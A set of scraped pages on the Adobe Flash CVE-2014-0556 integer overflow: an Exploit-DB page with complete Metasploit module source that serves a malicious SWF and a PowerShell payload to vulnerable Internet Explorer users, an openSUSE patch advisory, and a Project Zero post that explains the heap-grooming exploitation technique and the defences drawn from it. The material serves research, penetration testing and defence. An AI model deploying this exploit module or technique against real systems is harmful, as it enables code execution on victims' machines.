=== Content from www.exploit-db.com_abc63ea4_20250125_123251.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Adobe Flash Player - copyPixelsToByteArray Integer Overflow (Metasploit)

#### EDB-ID:

###### 36808

#### CVE:

###### [2014-0556](https://nvd.nist.gov/vuln/detail/CVE-2014-0556)

---

**EDB Verified:**

#### Author:

###### [Metasploit](/?author=3211)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Windows](/?platform=windows)

#### Date:

###### 2015-04-21

---

**Vulnerable App:**

```
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Powershell
  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info={})
    super(update_info(info,
      'Name'                => 'Adobe Flash Player copyPixelsToByteArray Integer Overflow',
      'Description'         => %q{
        This module exploits an integer overflow in Adobe Flash Player. The vulnerability occurs
        in the copyPixelsToByteArray method from the BitmapData object. The position field of the
        destination ByteArray can be used to cause an integer overflow and write contents out of
        the ByteArray buffer. This module has been tested successfully on Windows 7 SP1 (32-bit),
        IE 8 to IE 11 and Flash 14.0.0.176, 14.0.0.145 and 14.0.0.125.
      },
      'License'             => MSF_LICENSE,
      'Author'              =>
        [
          'Chris Evans', # Vulnerability discovery and 64 bit analysis / exploit
          'Nicolas Joly', # Trigger for 32 bit, according to the project zero ticket
          'hdarwin', # @hdarwin89, 32 bit public exploit, this msf module uses it
          'juan vazquez' # msf module
        ],
      'References'          =>
        [
          ['CVE', '2014-0556'],
          ['URL', 'http://googleprojectzero.blogspot.com/2014/09/exploiting-cve-2014-0556-in-flash.html'],
          ['URL', 'https://code.google.com/p/google-security-research/issues/detail?id=46'],
          ['URL', 'http://hacklab.kr/cve-2014-0556-%EB%B6%84%EC%84%9D/'],
          ['URL', 'http://malware.dontneedcoffee.com/2014/10/cve-2014-0556-adobe-flash-player.html'],
          ['URL', 'https://helpx.adobe.com/security/products/flash-player/apsb14-21.html']
        ],
      'Payload'             =>
        {
          'DisableNops' => true
        },
      'Platform'            => 'win',
      'BrowserRequirements' =>
        {
          :source  => /script|headers/i,
          :os_name => OperatingSystems::Match::WINDOWS_7,
          :ua_name => Msf::HttpClients::IE,
          :flash   => lambda { |ver| ver =~ /^14\./ && Gem::Version.new(ver) <=  Gem::Version.new('14.0.0.176') },
          :arch    => ARCH_X86
        },
      'Targets'             =>
        [
          [ 'Automatic', {} ]
        ],
      'Privileged'          => false,
      'DisclosureDate'      => 'Sep 23 2014',
      'DefaultTarget'       => 0))
  end

  def exploit
    @swf = create_swf
    super
  end

  def on_request_exploit(cli, request, target_info)
    print_status("Request: #{request.uri}")

    if request.uri =~ /\.swf$/
      print_status('Sending SWF...')
      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Cache-Control' => 'no-cache, no-store', 'Pragma' => 'no-cache'})
      return
    end

    print_status('Sending HTML...')
    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})
  end

  def exploit_template(cli, target_info)
    swf_random = "#{rand_text_alpha(4 + rand(3))}.swf"
    target_payload = get_payload(cli, target_info)
    psh_payload = cmd_psh_payload(target_payload, 'x86', {remove_comspec: true})
    b64_payload = Rex::Text.encode_base64(psh_payload)

    html_template = %Q|<html>
    <body>
    <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="1" height="1" />
    <param name="movie" value="<%=swf_random%>" />
    <param name="allowScriptAccess" value="always" />
    <param name="FlashVars" value="sh=<%=b64_payload%>" />
    <param name="Play" value="true" />
    <embed type="application/x-shockwave-flash" width="1" height="1" src="<%=swf_random%>" allowScriptAccess="always" FlashVars="sh=<%=b64_payload%>" Play="true"/>
    </object>
    </body>
    </html>
    |

    return html_template, binding()
  end

  def create_swf
    path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2014-0556', 'msf.swf')
    swf =  ::File.open(path, 'rb') { |f| swf = f.read }

    swf
  end

end

```

**Tags:**
[Metasploit Framework (MSF)](/?tag=3)

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from lists.opensuse.org_2d6b9ac7_20250125_123241.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/I4CUBARTK4HHZMB3JPEQXHGHFSBDXOLT/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/I4CUBARTK4HHZMB3JPEQXHGHFSBDXOLT/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/I4CUBARTK4HHZMB3JPEQXHGHFSBDXOLT/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/I4CUBARTK4HHZMB3JPEQXHGHFSBDXOLT/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/I4CUBARTK4HHZMB3JPEQXHGHFSBDXOLT/#I4CUBARTK4HHZMB3JPEQXHGHFSBDXOLT)

# [security-announce] openSUSE-SU-2014:1130-1: important: update flash-player to 11.2.202.40

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

15 Sep
2014

15 Sep
'14

23:04

openSUSE Security Update: update flash-player to 11.2.202.40
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: openSUSE-SU-2014:1130-1
Rating: important
References: #895856
Cross-References: CVE-2014-0547 CVE-2014-0548 CVE-2014-0549
CVE-2014-0550 CVE-2014-0551 CVE-2014-0552
CVE-2014-0553 CVE-2014-0554 CVE-2014-0555
CVE-2014-0556 CVE-2014-0557 CVE-2014-0559
Affected Products:
openSUSE 11.4
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes 12 vulnerabilities is now available.
Description:
Adobe Flash Player was updated to 11.2.202.406 (bnc#895856):
\* APSB14-21, CVE-2014-0547, CVE-2014-0548, CVE-2014-0549, CVE-2014-0550,
CVE-2014-0551, CVE-2014-0552, CVE-2014-0553, CVE-2014-0554,
CVE-2014-0555, CVE-2014-0556, CVE-2014-0557, CVE-2014-0559
More information can be found on:
<http://helpx.adobe.com/security/products/flash-player/apsb14-21.html>
Patch Instructions:
To install this openSUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- openSUSE 11.4:
zypper in -t patch 2014-83
To bring your system up-to-date, use "zypper patch".
Package List:
- openSUSE 11.4 (i586 x86\_64):
flash-player-11.2.202.406-127.1
flash-player-gnome-11.2.202.406-127.1
flash-player-kde4-11.2.202.406-127.1
References:
<http://support.novell.com/security/cve/CVE-2014-0547.html>
<http://support.novell.com/security/cve/CVE-2014-0548.html>
<http://support.novell.com/security/cve/CVE-2014-0549.html>
<http://support.novell.com/security/cve/CVE-2014-0550.html>
<http://support.novell.com/security/cve/CVE-2014-0551.html>
<http://support.novell.com/security/cve/CVE-2014-0552.html>
<http://support.novell.com/security/cve/CVE-2014-0553.html>
<http://support.novell.com/security/cve/CVE-2014-0554.html>
<http://support.novell.com/security/cve/CVE-2014-0555.html>
<http://support.novell.com/security/cve/CVE-2014-0556.html>
<http://support.novell.com/security/cve/CVE-2014-0557.html>
<http://support.novell.com/security/cve/CVE-2014-0559.html>
<https://bugzilla.novell.com/895856>
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/I4CUBARTK4HHZMB3JPEQXHGHFSBDXOLT/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/I4CUBARTK4HHZMB3JPEQXHGHFSBDXOLT/#I4CUBARTK4HHZMB3JPEQXHGHFSBDXOLT)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from googleprojectzero.blogspot.com_2bfc5817_20250126_083143.html ===


# [Project Zero](https://googleprojectzero.blogspot.com/)

News and updates from the Project Zero team at Google

## Tuesday, September 23, 2014

### Exploiting CVE-2014-0556 in Flash

Posted by Chris Evans, Kidnapper of RIP

A couple of weeks ago, Adobe released [security bulletin APSB14-21](http://helpx.adobe.com/security/products/flash-player/apsb14-21.html), including 8 fixes for bugs reported by Project Zero. Full details of these bugs are now public in our bug tracker. Some of the more interesting ones are a [double free in the RTMP protocol](https://code.google.com/p/google-security-research/issues/detail?id=76), or an [integer overflow concatenating strings](https://code.google.com/p/google-security-research/issues/detail?id=78). Again, we’d like to thank Adobe for a response time well ahead of our standard 90-day disclosure deadline.

The focus of this post is an [integer overflow leading to a buffer overflow in an ActionScript API](https://code.google.com/p/google-security-research/issues/detail?id=46).

Prelude
Before we get started, though, it’s worth briefly noting why there is so much value in writing an exploit. Finding and eliminating bugs obviously improves software correctness, but writing exploits is always a significant learning opportunity. Throughout the history of the security industry, there’s a long track record of offense driving defense, leading to technologies such as stack canaries, NX support in processors and ASLR.

Project Zero is not just a bug hunting initiative. We’re doing our part to continue the tradition of practical and public research of exploitation techniques -- and deriving defenses from them. For example, our [glibc defensive patch](https://sourceware.org/git/gitweb.cgi?p=glibc.git;h=52ffbdf25a1100986f4ae27bb0febbe5a722ab25) was accepted as a follow-on from our [glibc exploit](http://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html).

The case of this particular exploit starts with some irony on account of my overly hasty initial triage of the bug based on instincts which were later proved wrong by a more in-depth analysis of exploitation opportunities. In the bug history, you can see the claim “almost certainly 64-bit only” (wrong!) and then “does not work in Chrome 64-bit Linux”. We learned not to declare anything as unexploitable in our previous post about [exploiting a subtle condition in glibc](http://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html). Therefore, I had to declare shenanigans on myself and tackle the challenge: exploit this bug on Chrome 64-bit Linux.

The bug
The bug is triggered by calling BitmapData.copyPixelsToByteArray() with a reference to a ByteArray that has its position property set very large -- close to 2^32. This results in an integer overflow in 32-bit arithmetic. This occurs even on 64-bit because the relevant positions and length variables are (quite reasonably) stored in 32-bit variables. The code then believes that it can copy the pixels, starting to write them at position, and stay within the bounds of the buffer. Instead, a buffer overflow occurs. On 32-bit, the out-of-bounds write will be written before the start of the buffer because the pointer will wrap. On 64-bit, things are not as kind to the attacker. On a typical 64-bit Linux process setup with a 1MB buffer, the situation will look like this:

… | buffer: 1MB | heap, libs, binary |                 !!

The out-of-bounds write (in red) is at approximately buffer + 4GB. This will not wrap around the massive 64-bit address space, leading to a write way off in unmapped space. Insta-crash. The most obvious way to avoid the crash is to make the buffer massive, almost 4GB, leading to this situation:

… | buffer: 4GB                                      | !! heap, libs, binary |

This is readily exploitable. However, 64-bit Chrome on Linux has a defensive measure where the amount of mapped address space is limited to 4GB. So the large buffer allocation will fail and prevent that particular attack.

The heap groom
We’re going to need a trick to exploit this without slamming into the 4GB address space limit. The breakthrough -- that did not occur to me before attempting to develop an exploit -- comes when we realize that we don’t need to have the address space contiguously mapped. The out-of-bounds write will happily still go ahead even if it “jumps over” a hole in the address space. By having a hole in the address space, perhaps we can usefully trigger the corruption with less than 4GB mapped.

But how do we put this hole where we want it? Looking at how the Flash allocator works using the strace system tool, we see that very large allocations are serviced using unhinted mmap(). The Linux standard algorithm for servicing unhinted mmap() calls is to stack them adjacent and downwards in address space, as long as there isn’t a hole that can satisfy the request. So let’s see what happens when we allocate two 1GB chunks:

… | buffer2: 1GB | buffer1: 1GB | heap, libs, binary |

And the free the first one (a direct munmap() call is seen):

… | buffer2: 1GB |   1GB hole   | heap, libs, binary |

And then allocate a 2GB buffer (too big to fit in the hole):

… | buffer3: 2GB        | buffer2: 1GB |   1GB hole   | !! heap, libs, binary |

Aha! We’ve managed to engineer a situation where we’ve never had more than 4GB of address space mapped at any given moment, and at the end, a corruption at buffer3 + 4GB will land right in a writable region: the heap.

The corruption target
Now that we have a reasonably controlled memory corruption situation, we need to pick something to corrupt. As is pretty standard in modern heap buffer overflow exploitation in a scripting environment, we’re going to try and clobber a length of an array-like object. If we clobber any such length to be larger, we will then be able to read and write arbitrary relative heap memory. Once we’ve achieved such a powerful primitive, it’s essentially game over. Successful exploitation is pretty much assured: defeat ASLR by reading the value of a vtable and then write a new vtable that causes execution redirection to a sequence of opcodes that we choose.

We decide to corrupt a Vector.<uint> buffer object. This is a fairly standard, documented technique. I recommend Haifei Li’s [excellent paper as background reading](http://0xfeedface.org/sites/default/files/smashing_the_heap_with_vector_Li.pdf). Corrupting this buffer object is an obvious target because of three properties it possesses:

* The attacker can choose arbitrary sizes for these objects, meaning there is a lot of control over where in the heap they are placed relative to the pending heap corruption.
* The object starts with a length field, and corrupting it results in arbitrary heap relative read/write being exposed to script.
* The object is resilient to corruption in general. Aside from the length field, there is just a single pointer and trashing this pointer does not affect the ability to use the Vector, or otherwise cause noticeable stability issues during the course of exploitation. (We could even restore its value post-exploitation if we wished.)

To proceed, we simply create many (32) Vector.<uint> objects, all with buffers sized at about 2MB. These typically end up being stacked downwards at the top of the 1GB hole. In reality, the 1GB and 2GB allocations end up being a little larger than expected under the covers. This means that the corruption address of buffer3 + 4GB actually ends up corrupting objects within the 1GB hole instead of after it. This is ideal because we can make sure that only our large buffers are corrupted. In terms of the actual data to write, we just use the default values in an empty BitmapData, which are 0xffffffff (white pixels with a full alpha channel). 0xffffffff is a plenty large enough length to proceed with the exploit!

Proceeding onwards
There is nothing particularly exciting or unique about how the exploit proceeds to demonstrate code execution, so we’ll skip the lengthy explanation here. I’ve made an attempt to fully comment the exploit source code, so if you want to continue to follow along I recommend you read the materials attached to the [public bug](https://code.google.com/p/google-security-research/issues/detail?id=46).

The only part I’d flag as mildly interesting -- because it differs from the previously quoted paper -- is how we get known data at a known heap address. We do it with a Vector.<uint> object again. Each of these is in fact a pair of objects: a script object, which is a fixed sized and contains metadata; and the buffer object which contains the arbitrary data prefixed by the length. The script object forms a distinct pattern in memory and also contains a pointer to the buffer object. By locating any Vector.<uint> script object, we can then use a raw memory edit to change a property of the object. This property change will be visible to ActionScript so we then know which handle corresponds to a buffer at which raw address.

Conclusions, and turning what we’ve learned into generic defenses
Various technologies would have changed the exploitation landscape here, and can now be investigated in more detail:

* Randomized placement of large memory chunks. Non-deterministic placement of large allocations would have broken the heap grooming aspect of the exploit.
* Isolation of Vector.<uint> buffers. As we’ve seen, corruption of these buffers is an extremely dangerous condition. Some of the most recent advances in memory corruption defenses have been [“isolated” or “partitioned” heaps](https://labs.mwrinfosecurity.com/blog/2014/06/20/isolated-heap-friends---object-allocation-hardening-in-web-browsers/). These technologies seem applicable here. (They would need to be applied not just to the Vector buffers, but to the general case: partitioning off read/write objects where the attacker controls both the size and the content.)

Given the open-source nature of the [ActionScript engine](https://github.com/adobe-flash/avmplus), and the open-source nature of some [potentially helpful technologies](https://chromium.googlesource.com/chromium/blink/%2B/master/Source/wtf/PartitionAlloc.h), a prototype of a generic defense is now on the Project Zero TODO list!

Posted by
Anonymous

at

[12:31 AM](https://googleprojectzero.blogspot.com/2014/09/exploiting-cve-2014-0556-in-flash.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4838136820032157985&postID=304895122341465676&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=304895122341465676&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=304895122341465676&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=304895122341465676&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=304895122341465676&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=304895122341465676&target=pinterest "Share to Pinterest")

#### 3 comments:

1. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Chris Evans](https://www.blogger.com/profile/01004765479735675808)[September 23, 2014 at 12:58 PM](https://googleprojectzero.blogspot.com/2014/09/exploiting-cve-2014-0556-in-flash.html?showComment=1411502303610#c6488753986062327557)

   Thanks, I'll have a look a Vector.Object again. I didn't see the pointer you describe but I will re-check.

   Any links to the longjmp trick? I did consider it but it does not restore "caller saved" registers like RDI, RSI.

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=4838136820032157985&postID=6488753986062327557)Replies
   Reply
2. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Chris Evans](https://www.blogger.com/profile/01004765479735675808)[September 23, 2014 at 12:59 PM](https://googleprojectzero.blogspot.com/2014/09/exploiting-cve-2014-0556-in-flash.html?showComment=1411502377892#c3764361633065299360)

   Also, I think the data in Vector.Object is not raw. Isn't it tagged pointers? If so, the read/write data won't be arbitrary?

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=4838136820032157985&postID=3764361633065299360)Replies
   Reply
3. ![](//www.blogger.com/img/blogger_logo_round_35.png)[combabo](https://www.blogger.com/profile/11790342916526462869)[September 27, 2014 at 6:54 PM](https://googleprojectzero.blogspot.com/2014/09/exploiting-cve-2014-0556-in-flash.html?showComment=1411869253932#c594656828254722263)

   This comment has been removed by the author.

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=4838136820032157985&postID=594656828254722263)Replies
   Reply

Add commentLoad more...

[Newer Post](https://googleprojectzero.blogspot.com/2014/10/more-mac-os-x-and-iphone-sandbox.html "Newer Post")

[Older Post](https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html "Older Post")

[Home](https://googleprojectzero.blogspot.com/)

Subscribe to:
[Post Comments (Atom)](https://googleprojectzero.blogspot.com/feeds/304895122341465676/comments/default)

## Search This Blog

|  |  |
| --- | --- |

## Pages

* [About Project Zero](https://googleprojectzero.blogspot.com/p/about-project-zero.html)
* [Working at Project Zero](https://googleprojectzero.blogspot.com/p/working-at-project-zero.html)
* [0day "In the Wild"](https://googleprojectzero.blogspot.com/p/0day.html)
* [0day Exploit Root Cause Analyses](https://googleprojectzero.github.io/0days-in-the-wild/rca.html)
* [Vulnerability Disclosure FAQ](https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html)

## Archives

* ►
  [2024](https://googleprojectzero.blogspot.com/2024/)
  (12)
  + ►
    [December](https://googleprojectzero.blogspot.com/2024/12/)
    (3)
  + ►
    [November](https://googleprojectzero.blogspot.com/2024/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2024/10/)
    (2)
  + ►
    [June](https://googleprojectzero.blogspot.com/2024/06/)
    (3)
  + ►
    [April](https://googleprojectzero.blogspot.com/2024/04/)
    (2)

* ►
  [2023](https://googleprojectzero.blogspot.com/2023/)
  (11)
  + ►
    [November](https://googleprojectzero.blogspot.com/2023/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2023/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2023/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2023/08/)
    (4)
  + ►
    [April](https://googleprojectzero.blogspot.com/2023/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2023/03/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2023/01/)
    (2)

* ►
  [2022](https://googleprojectzero.blogspot.com/2022/)
  (17)
  + ►
    [December](https://googleprojectzero.blogspot.com/2022/12/)
    (1)
  + ►
    [November](https://googleprojectzero.blogspot.com/2022/11/)
    (3)
  + ►
    [October](https://googleprojectzero.blogspot.com/2022/10/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2022/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2022/06/)
    (3)
  + ►
    [May](https://googleprojectzero.blogspot.com/2022/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2022/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2022/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2022/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2022/01/)
    (1)

* ►
  [2021](https://googleprojectzero.blogspot.com/2021/)
  (24)
  + ►
